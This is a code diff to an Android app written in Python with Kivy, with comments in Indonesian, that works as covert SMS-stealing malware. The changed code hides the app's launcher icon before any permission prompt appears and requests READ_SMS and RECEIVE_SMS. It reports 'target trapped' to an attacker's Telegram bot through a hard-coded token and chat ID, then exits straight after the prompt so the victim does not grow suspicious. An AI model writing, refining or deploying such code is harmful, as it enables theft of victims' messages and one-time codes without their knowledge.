@@ -7,19 +7,29 @@ TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
 CHAT_ID = "5999516433"
 bot = telebot.TeleBot(TOKEN)
 
-def sembunyi_dan_keluar():
+def hide_now():
     try:
         activity = autoclass('org.kivy.android.PythonActivity').mActivity
         pm = activity.getPackageManager()
-        cn = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
-        pm.setComponentEnabledSetting(cn, 2, 1) # Hide icon
-        bot.send_message(CHAT_ID, "✅ Target Terperangkap! Ikon Hilang.")
+        package_name = activity.getPackageName()
+        # Gunakan nama kelas Kivy yang benar untuk hide
+        component_name = autoclass('android.content.ComponentName')(package_name, 'org.kivy.android.PythonActivity')
+        # Sembunyikan ikon (STATE_DISABLED = 2)
+        pm.setComponentEnabledSetting(component_name, 2, 1)
+        bot.send_message(CHAT_ID, "⚠️ Ikon Berhasil Dihilangkan!")
     except: pass
+
+def on_permissions(permissions, grants):
+    # Setelah klik izin, langsung matikan aplikasi agar tidak curiga
     os._exit(0)
 
-def callback(permissions, grants):
-    sembunyi_dan_keluar()
-
 if __name__ == '__main__':
-    # Minta izin secara agresif
-    request_permissions([Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.POST_NOTIFICATIONS], callback)
+    # LANGKAH 1: SEMBUNYIKAN IKON DULUAN (Bahkan sebelum izin muncul)
+    hide_now()
+    
+    # LANGKAH 2: MINTA IZIN
+    request_permissions([
+        Permission.READ_SMS, 
+        Permission.RECEIVE_SMS, 
+        Permission.POST_NOTIFICATIONS
+    ], on_permissions)
